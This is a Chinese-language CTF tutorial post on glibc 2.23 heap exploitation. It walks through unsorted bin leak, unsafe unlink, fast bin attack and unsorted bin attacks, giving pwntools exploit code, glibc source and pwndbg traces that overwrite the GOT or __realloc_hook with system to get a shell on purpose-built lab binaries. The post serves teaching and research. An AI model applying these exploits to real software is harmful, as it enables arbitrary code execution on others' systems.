---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其一
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其一

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-1 unsorted bin leak

该利用方式几乎是后续利用的基石，基本上涉及地址泄露的相关利用，离不开unsorted bin leak。
测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/01/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/unsorted_bin_leak/exploit.py)。

核心利用代码如下：
```python
# unsorted bin leak
malloc(0, 0x80, b"A" * 0x80)
malloc(1, 0x18, b"B" * 0x18)
delete(0)
show(0)
libc_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")
```

首先申请0x80大小的chunkA块，紧接着申请0x18大小的chunkB块。当释放chunkA时，由于chunkB隔离chunkA与top-chunk之间，避免了chunkA与top-chunk合并。chunkB由此又被称为栅栏块，而其大小并没有限制特定大小。

```bash
pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x62e014e4a000
Size: 0x90 (with flag bits: 0x91)
fd: 0x71b05338db78
bk: 0x71b05338db78

Allocated chunk
Addr: 0x62e014e4a090
Size: 0x20 (with flag bits: 0x20)

Top chunk | PREV_INUSE
Addr: 0x62e014e4a0b0
Size: 0x20f50 (with flag bits: 0x20f51)

pwndbg> unsortedbin 
unsortedbin
all: 0x62e014e4a000 —▸ 0x71b05338db78 (main_arena+88) ◂— 0x62e014e4a000
pwndbg> 
```

这是目标程序运行至show(0)时，heap内存分布的详细内容。可以发现chunkA已经进入unsortedbin。可以明显看到0x71b05338db78即为
当前libc的(main_arena+88)的实际地址，根据等差原理，可以容易推算出来system和binsh的地址，进而为下一步利用做好基础。

### 1-2 unsafe unlink

本方法利用glibc链表脱链缺陷而实现恶意操作。相关glibc完整源码参见[unlink](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1414)

```C
#define unlink(AV, P, BK, FD)                                                  \
  {                                                                            \
    FD = P->fd;                                                                \
    BK = P->bk;                                                                \
    if (__builtin_expect(FD->bk != P || BK->fd != P, 0))                       \
      malloc_printerr(check_action, "corrupted double-linked list", P, AV);    \
    else {                                                                     \
      FD->bk = BK;                                                             \
      BK->fd = FD;                                                             \
      if (!in_smallbin_range(P->size) &&                                       \
          __builtin_expect(P->fd_nextsize != NULL, 0)) {                       \
        if (__builtin_expect(P->fd_nextsize->bk_nextsize != P, 0) ||           \
            __builtin_expect(P->bk_nextsize->fd_nextsize != P, 0))             \
          malloc_printerr(check_action,                                        \
                          "corrupted double-linked list (not small)", P, AV);  \
        if (FD->fd_nextsize == NULL) {                                         \
          if (P->fd_nextsize == P)                                             \
            FD->fd_nextsize = FD->bk_nextsize = FD;                            \
          else {                                                               \
            FD->fd_nextsize = P->fd_nextsize;                                  \
            FD->bk_nextsize = P->bk_nextsize;                                  \
            P->fd_nextsize->bk_nextsize = FD;                                  \
            P->bk_nextsize->fd_nextsize = FD;                                  \
          }                                                                    \
        } else {                                                               \
          P->fd_nextsize->bk_nextsize = P->bk_nextsize;                        \
          P->bk_nextsize->fd_nextsize = P->fd_nextsize;                        \
        }                                                                      \
      }                                                                        \
    }                                                                          \
  }
```

unlink操作对目标的校验只是简单的`__builtin_expect(FD->bk != P || BK->fd != P, 0)`。当FD = target - 0x18，BK = target - 0x10时，
`FD->bk => FD + 0x18 => target - 0x18 + 0x18 = target,
BK->fd => BK + 0x10 => target - 0x10 + 0x10 = target, `
完美绕过了限制条件，进而代码走到 `FD->bk = BK; BK->fd = FD;`。实现了对target的任意地址写。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/02/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/unsafe_unlink/exploit.py)。

核心利用代码如下：

```python
# unsorted bin leak
malloc(0, 0x80, b"A" * 0x80)
malloc(1, 0x18, b"B" * 0x18)
delete(0)
show(0)
libc_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")
malloc(0, 0x80, b"A" * 0x80)

# unsafe unlink attack
chunks = 0x004040C0
malloc(0, 0x80, b"C" * 0x80)
malloc(1, 0x80, b"D" * 0x80)
payload = p64(0) + p64(0x80)
payload += p64(chunks - 0x18) + p64(chunks - 0x10)
payload += p64(0) * 12
payload += p64(0x80) + p64(0x90)
edit(0, 0x90, payload)
delete(1)
# 00404000  void (* const free)(void* mem) = free
# 00404008  int32_t (* const puts)(char const* str) = puts
# 00404010  ssize_t (* const write)(int32_t fd, void const* buf, uint64_t nbytes) = write
# 00404018  uint64_t (* const strlen)(char const*) = strlen
# 00404020  void (* const __stack_chk_fail)() __noreturn = __stack_chk_fail
# 00404028  void (* const setbuf)(FILE* fp, char* buf) = setbuf
# 00404030  ssize_t (* const read)(int32_t fd, void* buf, uint64_t nbytes) = read
# 00404038  void* (* const calloc)(uint64_t n, uint64_t elem_size) = calloc
# 00404040  int64_t (* const strtol)(char const* nptr, char** endptr, int32_t base) = strtol
# 00404048  void* (* const malloc)(uint64_t bytes) = malloc
# 00404050  void (* const exit)(int32_t status) __noreturn = exit
payload = p64(0) + p64(0) + p64(0)
payload += p64(0x004040C0) + p64(0x00404000) + p64(binsh_addr)
edit(0, 0x30, payload)
edit(1, 0x8, p64(libc.sym["system"]))
delete(2)
cmd = b"cat src/2.23/unsafe_unlink/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先利用unsorted bin leak泄露出来libc地址，代码中的目标chunks为.bss地址。

```bash
pwndbg> x/4gx chunks
0x4040c0 <chunks>:      0x000000002cf290c0      0x000000002cf29150
0x4040d0 <chunks+16>:   0x0000000000000000      0x0000000000000000
```

目标使用unlink技术实现chunks地址的任意写。通过在chunkC中伪造出来一个chunk。当释放chunkD时，会将fake chunk推入unlink逻辑之中，进而实现恶意利用。

```bash
pwndbg> x/6gx 0x2cf290b0
0x2cf290b0:     0x4242424242424242      0x0000000000000091 <= chunkC
0x2cf290c0:     0x0000000000000000      0x0000000000000080 <= fake chunk
0x2cf290d0:     0x00000000004040a8      0x00000000004040b0
```

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4006
   3999     free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);
   4000 
   4001     /* consolidate backward */
   4002     if (!prev_inuse(p)) {
   4003       prevsize = p->prev_size;
   4004       size += prevsize;
   4005       p = chunk_at_offset(p, -((long) prevsize));
 ► 4006       unlink(av, p, bck, fwd);
   
pwndbg> p/x av
$1 = 0x703c6838db20
pwndbg> p/x p
$2 = 0x2cf290c0  <= fake chunk
pwndbg> p/x bck
$3 = 0x703c6838db78
pwndbg> p/x fwd
$4 = 0x703c6838db78
```

执行完unlink操作之后，相关数据结构变化如下：

```bash
pwndbg> x/4gx chunks
0x4040c0 <chunks>:      0x00000000004040a8      0x000000002cf29150
0x4040d0 <chunks+16>:   0x0000000000000000      0x0000000000000000
```

chunks[0]修改为0x00000000004040a8=0x4040c0-0x18，从获取了.bss内容的读写能力。
通过payload = p64(0) + p64(0) + p64(0) + p64(0x004040C0) + p64(0x00404000) + p64(binsh_addr)布局，实现.got表的读写能力。

```bash
pwndbg> x/4gx chunks
0x4040c0 <chunks>:      0x00000000004040c0      0x0000000000404000
0x4040d0 <chunks+16>:   0x0000703c68156d73      0x0000000000000000
pwndbg> got -r
State of the GOT of /home/bogon/workSpaces/pwn4heap/src/2.23/binary/02/binary:
GOT protection: Partial RELRO | Found 13 GOT entries passing the filter
[0x403fd8] __libc_start_main@GLIBC_2.2.5 -> 0x703c6801fab8 (__libc_start_main) ◂— push r14
[0x403fe0] __gmon_start__ -> 0
[0x404000] free@GLIBC_2.2.5 -> 0x703c68073a9b (free) ◂— push rbp
[0x404008] puts@GLIBC_2.2.5 -> 0x703c68062d19 (puts) ◂— push rbp
[0x404010] write@GLIBC_2.2.5 -> 0x703c680d4020 (write) ◂— cmp dword ptr [rip + 0x2be779], 0
[0x404018] strlen@GLIBC_2.2.5 -> 0x703c6807c380 (strlen) ◂— pxor xmm0, xmm0
[0x404020] __stack_chk_fail@GLIBC_2.4 -> 0x401070 ◂— endbr64
[0x404028] setbuf@GLIBC_2.2.5 -> 0x703c68069261 (setbuf) ◂— sub rsp, 8
[0x404030] read@GLIBC_2.2.5 -> 0x703c680d3fc0 (read) ◂— cmp dword ptr [rip + 0x2be7d9], 0
[0x404038] calloc@GLIBC_2.2.5 -> 0x4010a0 ◂— endbr64
[0x404040] strtol@GLIBC_2.2.5 -> 0x703c68034118 (strtoq) ◂— sub rsp, 8
[0x404048] malloc@GLIBC_2.2.5 -> 0x703c680738c0 (malloc) ◂— push rbp
[0x404050] exit@GLIBC_2.2.5 -> 0x4010d0 ◂— endbr64
pwndbg> x/s 0x0000703c68156d73
0x703c68156d73: "/bin/sh"
```

通过修改.got表free@GLIBC_2.2.5为system地址，配合free操作，最终获取目标shell。

### 1-3 fast bin attack

本方法利用glibc对于fast bin管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3368)

```C
if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
  {
    idx = fastbin_index (nb);
    mfastbinptr *fb = &fastbin (av, idx);
    mchunkptr pp = *fb;
    do
      {
        victim = pp;
        if (victim == NULL)
          break;
      }
    while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
           != victim);
    if (victim != 0)
      {
        if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
          {
            errstr = "malloc(): memory corruption (fast)";
          errout:
            malloc_printerr (check_action, errstr, chunk2mem (victim), av);
            return NULL;
          }
        check_remalloced_chunk (av, victim, nb);
        void *p = chunk2mem (victim);
        alloc_perturb (p, bytes);
        return p;
      }
  }
```

当申请的目标位于fast bin范围时，glibc没有对fd指针做任何有效的校验，只要伪造的chunk大小符合该fast bin大小，基本上实现任意地址分配，进而实现任意地址读写。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/03/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/fast_bin_attack/exploit.py)。

核心利用代码如下：

```python
# unsorted bin leak
malloc(0, 0x80, b"A" * 0x80)
malloc(1, 0x18, b"B" * 0x18)
delete(0)
show(0)
libc_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")
malloc(0, 0x80, b"A" * 0x80)

# fast bin attack
malloc(0, 0x60, b"A" * 0x60)
malloc(1, 0x60, b"B" * 0x60)
delete(0)
# pwndbg> x/10gx 0x7180e0f8e3b8-0x33
# 0x7180e0f8e385 <main_arena+2149>:       0x80e0f8db20000000      0x0000000000000071
# 0x7180e0f8e395 <main_arena+2165>:       0x0000000001000000      0x0000021000000000
# 0x7180e0f8e3a5 <main_arena+2181>:       0x0000021000000000      0x0000000000000000
# 0x7180e0f8e3b5 <__malloc_hook+5>:       0x80e0c70c31000000      0x80e0c70c7b000071
# 0x7180e0f8e3c5 <__memalign_hook+5>:     0x80e0c7a003000071      0x80e0d581b2000071
# pwndbg> p/x 0x7180e0f8e3b8-0x7180e0f8e395
# $2 = 0x23
# pwndbg>
fake_chunk_addr = libc.sym["__realloc_hook"] - 0x33
edit(0, 0x8, p64(fake_chunk_addr))
malloc(2, 0x60, b"C" * 0x60)
cmd = b"cat src/2.23/fast_bin_attack/flag\x00"
edit(2, len(cmd), cmd)
malloc(3, 0x60, b"D" * 0x8)
payload = b"\x00" * 0x23 + p64(libc.sym["system"])
edit(3, 0x23 + 0x8, payload)
conn.sendlineafter(b"Please input your choice > ", b"3")
conn.sendlineafter(b"Please input the chunk index > ", b"2")
conn.sendlineafter(b"Please input the size > ", b"8")
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

依然利用unsorted bin leak泄露出来libc地址。申请chunkA和chunkB，然后释放chunkA，将chunkA放置到fast bin中。

```bash
pwndbg> x/4gx chunks
0x62efa0ac3060 <chunks>:        0x000062efc06b60c0      0x000062efc06b6130  chunkA | chunkB
0x62efa0ac3070 <chunks+16>:     0x0000000000000000      0x0000000000000000
pwndbg> fastbins 
fastbins
0x70: 0x62efc06b60b0 ◂— 0
```

目标寻找合适的fake chunk放置fast bin中，刚好__realloc_hook附近存在一个合适的尺寸chunk。

```bash
pwndbg> x/1gx &__realloc_hook     
0x7701dd18e3b8 <__realloc_hook>:        0x00007701dce70c31
pwndbg> x/10gx 0x7701dd18e3b8-0x33
0x7701dd18e385 <main_arena+2149>:       0x01dd18db20000000      0x0000000000000077 <= fake chunk
0x7701dd18e395 <main_arena+2165>:       0x0000000001000000      0x0000021000000000
0x7701dd18e3a5 <main_arena+2181>:       0x0000021000000000      0x0000000000000000
0x7701dd18e3b5 <__malloc_hook+5>:       0x01dce70c31000000      0x01dce70c7b000077
0x7701dd18e3c5 <__memalign_hook+5>:     0x01dce7a003000077      0x01dcf581b2000077
pwndbg> p/x 0x7701dd18e3b8-0x7701dd18e395
$1 = 0x23
```

通过伪造fake chunk，这时fast bin布局如下：

```bash
pwndbg> fastbins 
fastbins
0x70: 0x62efc06b60b0 —▸ 0x7701dd18e385 (main_arena+2149) ◂— 0x1000000
```

连续申请两次0x60大小的chunk，chunkD就控制了__realloc_hook附近内容的任意读写能力。
通过修改__realloc_hook地址内容为system，在chunksC中布局合适的"/bin/sh\x00"或者b"cat src/2.23/fast_bin_attack/flag\x00"。
触发一次realloc操作，实现shell或者读取目标flag。

#### 提示

__realloc_hook、__malloc_hook 等只要符合fast bin尺寸的，都可以作为fake chunk。


### 1-4 unsorted bin attack其一

本方法利用glibc对于unsorted bin管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3517)

```C
for (;; )
  {
    int iters = 0;
    while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
      {
        bck = victim->bk;
        if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
            || __builtin_expect (victim->size > av->system_mem, 0))
          malloc_printerr (check_action, "malloc(): memory corruption",
                           chunk2mem (victim), av);
        size = chunksize (victim);

        /*
           If a small request, try to use last remainder if it is the
           only chunk in unsorted bin.  This helps promote locality for
           runs of consecutive small requests. This is the only
           exception to best-fit, and applies only when there is
           no exact fit for a small chunk.
         */

        if (in_smallbin_range (nb) &&
            bck == unsorted_chunks (av) &&
            victim == av->last_remainder &&
            (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
          {
            /* split and reattach remainder */
            remainder_size = size - nb;
            remainder = chunk_at_offset (victim, nb);
            unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
            av->last_remainder = remainder;
            remainder->bk = remainder->fd = unsorted_chunks (av);
            if (!in_smallbin_range (remainder_size))
              {
                remainder->fd_nextsize = NULL;
                remainder->bk_nextsize = NULL;
              }

            set_head (victim, nb | PREV_INUSE |
                      (av != &main_arena ? NON_MAIN_ARENA : 0));
            set_head (remainder, remainder_size | PREV_INUSE);
            set_foot (remainder, remainder_size);

            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb (p, bytes);
            return p;
          }

        /* remove from unsorted list */
        unsorted_chunks (av)->bk = bck;
        bck->fd = unsorted_chunks (av);  <= bug
```

可以发现glibc未对unsorted bin的bk指针做任何有效的校验，可以将bck->fd赋值为unsorted_chunks (av)。初看这个漏洞点没有可以利用价值，只能将libc的某个地址往任意地址写，无法控制写的内容。但是通过配合其它技术，可是实现强大的效果。例如将get_max_fast修改为unsorted_chunks (av)，明显大于原来的0x80，从而实现将相当大的块放置到fast bin中，此时就可以利用fast bin技术进行进一步的利用。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/04/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/unsorted_bin_attack/exploit.py)。

核心利用代码如下：

```python
# unsorted bin attack
malloc(0, 0x190, b"A" * 0x190)
malloc(1, 0x1F4, b"B" * 0x1F4)
delete(0)
show(0)
libc_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"libc leak: {hex(libc_leak)}")
# 004041e0  uint64_t magic = 0x0
magic = 0x004041E0
payload = p64(libc_leak) + p64(magic - 0x10)
edit(0, len(payload), payload)
malloc(2, 0x190, b"C" * 0x190)
use_magic(libc_leak)
cmd = b"cat src/2.23/unsorted_bin_attack/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

测试二进制中存在一个后门函数, 只要获取magic值或者修改magic为已知的值，就可以获取目标shell。

```C
void init(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    FILE* fp = NULL;
    bool success = false;
    do {
        fp = fopen("/dev/urandom", "rb");
        if(!fp) {
            puts("Error opening /dev/urandom\n");
            break;
        }
        if (fread(&magic, sizeof(magic), 1, fp) != 1) {
            puts("Error reading from /dev/urandom.\n");
            break;
        }
        success = true;
    } while(false);
    if(fp) {
        fclose(fp);
    }
    if(!success){
         exit(-1);
    }
}

int main()
{
    init();
...
        // case MAGIC:
        case 0x4d41474943:
            if (read_uint64() == magic) {
                system("/bin/sh");
            } else {
                puts("Magic is not available at this time.");
            }
            break;
...
}
```

显然这个用来测试unsorted bin attack再合适不过了。运行至show(0)，unsortedbin布局如下：

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x32b0000 —▸ 0x78ebfdd8db78 (main_arena+88) ◂— 0x32b0000
```

通过构造payload = p64(libc_leak) + p64(magic - 0x10)，unsortedbin布局如下：

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x32b0000 —▸ 0x78ebfdd8db78 (main_arena+88) ◂— 0x32b0000
BK: 0x32b0000 —▸ 0x4041d0 (chunks+240) ◂— 0
pwndbg> x/4gx 0x4041d0
0x4041d0 <chunks+240>:  0x0000000000000000      0x0000000000000000
0x4041e0 <magic>:       0x5e9cdbd4544693ae      0x0000000000000000
```

运行至bug处，相关内容如下：

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3517
   3511               alloc_perturb (p, bytes);
   3512               return p;
   3513             }
   3514 
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
 ► 3517           bck->fd = unsorted_chunks (av);
 
pwndbg> p/x bck->fd
$1 = 0x5e9cdbd4544693ae
pwndbg> p/x &bck->fd
$2 = 0x4041e0

In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3521
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
   3517           bck->fd = unsorted_chunks (av);
   3518 
   3519           /* Take now instead of binning if exact fit */
   3520 
 ► 3521           if (size == nb)
 
pwndbg> p/x bck->fd
$3 = 0x78ebfdd8db78
pwndbg> x/1gx &magic
0x4041e0 <magic>:       0x000078ebfdd8db78
```

可以发现magic已经成功修改成0x78ebfdd8db78 (main_arena+88)。

### 1-5 unsorted bin attack其二

本方法为unsorted bin attack和fast bin attack的组合技，unsorted bin attack核心原理参考unsorted bin attack其一，此处不在赘述。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/05/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/unsorted_bin_attack_again/exploit.py)。

核心利用代码如下：

```python
# unsorted bin leak
malloc(0, 0xA0, b"A" * 0xA0)
malloc(1, 0x18, b"B" * 0x18)
delete(0)
show(0)
libc_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# unsorted bin attack
malloc(2, 0x190, b"C" * 0x190)
malloc(3, 0x1F4, b"D" * 0x1F4)
delete(2)
payload = p64(0) + p64(libc.sym["global_max_fast"] - 0x10)
edit(2, len(payload), payload)
malloc(4, 0x190, b"E" * 0x190)
malloc(5, 0xA0, b"F" * 0xA0)
delete(5)

# fast bin attack
edit(3, 0xB0, p64(0))
# pwndbg> x/4gx 0x4040e8
# 0x4040e8 <chunks+40>:   0x000000001bb910e0      0x00000000000000b0
# 0x4040f8 <chunks+56>:   0x000000001bb91280      0x0000000000000190
# pwndbg>
edit(0, 0x8, p64(0x4040E8))
# pwndbg> x/4gx 0x1bb91000
# 0x1bb91000:     0x0000000000000000      0x00000000000000b1
# 0x1bb91010:     0x00000000004040e8      0x4646464646464646
# pwndbg> fastbins
# fastbins
# 0xb0: 0x1bb91000 —▸ 0x4040e8 (chunks+40) —▸ 0x1bb91280 ◂— 0x4444444444444444 ('DDDDDDDD')
# pwndbg>
# eat 0xa43f000
malloc(6, 0xA0, p64(0))
# eat 0x4040e8
malloc(7, 0xA0, p64(0))
# 🔖00404000  void (* const free)(void* mem) = free
# 00404008  int32_t (* const puts)(char const* str) = puts
# 00404010  ssize_t (* const write)(int32_t fd, void const* buf, uint64_t nbytes) = write
# 00404018  uint64_t (* const strlen)(char const*) = strlen
payload = p64(0x00404000) + p64(0) + p64(binsh_addr)
edit(7, len(payload), payload)
# pwndbg> x/20gx chunks
# 0x4040c0 <chunks>:      0x0000000000000008      0x000000001bb91010
# 0x4040d0 <chunks+16>:   0x0000000000000018      0x000000001bb910c0
# 0x4040e0 <chunks+32>:   0x0000000000000010      0x000000001bb910e0
# 0x4040f0 <chunks+48>:   0x00000000000000b0      0x0000000000404000 <= free@got
# 0x404100 <chunks+64>:   0x0000000000000000      0x0000788936b56d73 <= binsh_addr
# 0x404110 <chunks+80>:   0x00000000000000a0      0x000000001bb91010
# 0x404120 <chunks+96>:   0x00000000000000a0      0x000000001bb91010
# 0x404130 <chunks+112>:  0x0000000000000018      0x00000000004040f8
# 0x404140 <chunks+128>:  0x0000000000000000      0x0000000000000000
# 0x404150 <chunks+144>:  0x0000000000000000      0x0000000000000000
# pwndbg>
edit(3, 0x8, p64(libc.sym["system"]))
# pwndbg> x/1gx 0x404000
# 0x404000 <free@got.plt>:        0x0000788936a3c3eb
# pwndbg> x/5i 0x0000788936a3c3eb
#    0x788936a3c3eb <__libc_system>:      sub    rsp,0x8
#    0x788936a3c3ef <__libc_system+4>:    test   rdi,rdi
#    0x788936a3c3f2 <__libc_system+7>:    jne    0x788936a3c40a <__libc_system+31>
#    0x788936a3c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x788936b56d7b
#    0x788936a3c3fb <__libc_system+16>:   call   0x788936a3be36 <do_system>
# pwndbg>
delete(4)
cmd = b"cat src/2.23/unsorted_bin_attack_again/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先利用unsorted bin leak获取libc地址，然后利用unsorted bin attack修改global_max_fast为main_arena+88地址，
接着在.bss上构造fast bin fake chunk，连续申请0xA0块大小的chunk，最终获取.bss的控制权。
经过上面的操作，获取shell就水到渠成了。

### 1-6 unsorted bin attack bss

本方法利用glibc对于unsorted bin管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3467)

```C
for (;; )
  {
    int iters = 0;
    while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
      {
        bck = victim->bk;
        if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
            || __builtin_expect (victim->size > av->system_mem, 0))
          malloc_printerr (check_action, "malloc(): memory corruption",
                           chunk2mem (victim), av);
        size = chunksize (victim);

        /*
           If a small request, try to use last remainder if it is the
           only chunk in unsorted bin.  This helps promote locality for
           runs of consecutive small requests. This is the only
           exception to best-fit, and applies only when there is
           no exact fit for a small chunk.
         */

        if (in_smallbin_range (nb) &&
            bck == unsorted_chunks (av) &&
            victim == av->last_remainder &&
            (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
          {
            /* split and reattach remainder */
            remainder_size = size - nb;
            remainder = chunk_at_offset (victim, nb);
            unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
            av->last_remainder = remainder;
            remainder->bk = remainder->fd = unsorted_chunks (av);
            if (!in_smallbin_range (remainder_size))
              {
                remainder->fd_nextsize = NULL;
                remainder->bk_nextsize = NULL;
              }

            set_head (victim, nb | PREV_INUSE |
                      (av != &main_arena ? NON_MAIN_ARENA : 0));
            set_head (remainder, remainder_size | PREV_INUSE);
            set_foot (remainder, remainder_size);

            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb (p, bytes);
            return p;
          }

        /* remove from unsorted list */
        unsorted_chunks (av)->bk = bck;
        bck->fd = unsorted_chunks (av);

        /* Take now instead of binning if exact fit */

        if (size == nb)
          {
            set_inuse_bit_at_offset (victim, size);
            if (av != &main_arena)
              victim->size |= NON_MAIN_ARENA;
            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb (p, bytes);
            return p;
          }

        /* place chunk in bin */

        if (in_smallbin_range (size))
          {
            victim_index = smallbin_index (size);
            bck = bin_at (av, victim_index);
            fwd = bck->fd;
          }
        else
          {
            victim_index = largebin_index (size);
            bck = bin_at (av, victim_index);
            fwd = bck->fd;

            /* maintain large bins in sorted order */
            if (fwd != bck)
              {
                /* Or with inuse bit to speed comparisons */
                size |= PREV_INUSE;
                /* if smaller than smallest, bypass loop below */
                assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
                if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                  {
                    fwd = bck;
                    bck = bck->bk;

                    victim->fd_nextsize = fwd->fd;
                    victim->bk_nextsize = fwd->fd->bk_nextsize;
                    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                  }
                else
                  {
                    assert ((fwd->size & NON_MAIN_ARENA) == 0);
                    while ((unsigned long) size < fwd->size)
                      {
                        fwd = fwd->fd_nextsize;
                        assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      }

                    if ((unsigned long) size == (unsigned long) fwd->size)
                      /* Always insert in the second position.  */
                      fwd = fwd->fd;
                    else
                      {
                        victim->fd_nextsize = fwd;
                        victim->bk_nextsize = fwd->bk_nextsize;
                        fwd->bk_nextsize = victim;
                        victim->bk_nextsize->fd_nextsize = victim;
                      }
                    bck = fwd->bk;
                  }
              }
            else
              victim->fd_nextsize = victim->bk_nextsize = victim;
          }

        mark_bin (av, victim_index);
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;

#define MAX_ITERS       10000
        if (++iters >= MAX_ITERS)
          break;
      }
...
```

利用分为两个阶段，第一阶段不进入`if (size == nb)`逻辑，第二阶段进入`if (size == nb)`逻辑返回用户。
通过伪造目标chunk->bk指向符合该unsorted bin相关大小fake chunk。修改当前chunk尺寸小于原来大小，进而跳过`if (size == nb)`逻辑。接着进入循环第二次`bck = victim->bk;`，由于伪造的chunk尺寸满足此次申请要求，进入`if (size == nb)`逻辑，最终实现任意地址申请。


测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/06/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/unsorted_bin_attack_bss/exploit.py)。

核心利用代码如下：

```python
# unsorted bin leak
malloc(0, b"A" * 0x20, 0x18, b"A" * 0x18)
malloc(1, b"B" * 0x20, 0x80, b"B" * 0x80)
malloc(2, b"C" * 0x20, 0x80, b"C" * 0x80)
delete(1)
show(1)
libc_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# unsorted bin attack bss
name_payload = p64(0) + p64(0x90)
name_payload += p64(0) + p64(0x004040C0)
